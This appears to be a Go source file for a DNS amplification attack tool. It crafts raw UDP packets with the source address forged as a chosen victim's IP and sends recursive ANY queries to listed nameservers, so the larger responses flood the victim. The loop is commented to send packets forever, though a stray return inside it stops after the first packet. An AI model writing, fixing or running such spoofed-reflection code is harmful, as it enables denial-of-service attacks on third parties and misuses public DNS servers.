package dnsamp

import (
	"math/rand"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	// "github.com/google/gopacket/pcap"
	"golang.org/x/net/ipv4"
)


type Target struct {
    DomainName string
    NameServer string
}

const SRC_PORT = 42000

var options = gopacket.SerializeOptions{
        ComputeChecksums: true,
        FixLengths:       true,
}
var netIface string
var targetIP net.IP

func Configure(iface string, target net.IP) {
    netIface = iface
    targetIP = target
}

// create ANY request packet
func makePacket(domainName string, nameserverIP net.IP) (*layers.IPv4, []byte) {
    ip := layers.IPv4{
        Version: 4,
        TTL: 64,
        Protocol: layers.IPProtocolUDP,
        SrcIP: targetIP,
        DstIP: nameserverIP,
    }
    udp := layers.UDP{
        SrcPort: SRC_PORT,
        DstPort: 53,
    }
    udp.SetNetworkLayerForChecksum(&ip)
    qst := layers.DNSQuestion{
        Name: []byte(domainName),
        Class: layers.DNSClassIN,
        Type: layers.DNSType(layers.DNSClassAny),
    }
    dns := layers.DNS{
        RD: true,
        ID: uint16(rand.Int()),
        TC: false,
        OpCode: 0,
        Questions: []layers.DNSQuestion{qst},
    }
    buffer := gopacket.NewSerializeBuffer()
    if err := gopacket.SerializeLayers(buffer, options,
        &udp,
        &dns,
    ); err != nil {
        panic(err)
    }
    return &ip, buffer.Bytes()
}

func Send(servers []Target) {
    c, err := net.ListenPacket("ip4:udp", "")
    if err != nil {
        panic(err)
    }
    conn, err := ipv4.NewRawConn(c)
    if err != nil {
        panic(err)
    }
    defer conn.Close()
    // Send packets forever
    for {
        for _, server := range servers {
            nameserverIP := net.ParseIP(server.NameServer)
            // Ignore invalid lines in the file
            if nameserverIP != nil {
                ip, payload:= makePacket(server.DomainName, nameserverIP)
                ipHeaderBuf := gopacket.NewSerializeBuffer()
                err := ip.SerializeTo(ipHeaderBuf, options)
                if err != nil {
                    panic(err)
                }
                ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
                if err != nil {
                    panic(err)
                }
                // IP header src does not get used for some reason
                err = conn.WriteTo(ipHeader, payload, nil)
                if err != nil {
                    panic(err)
                }
                return
            }
        }
    }
}

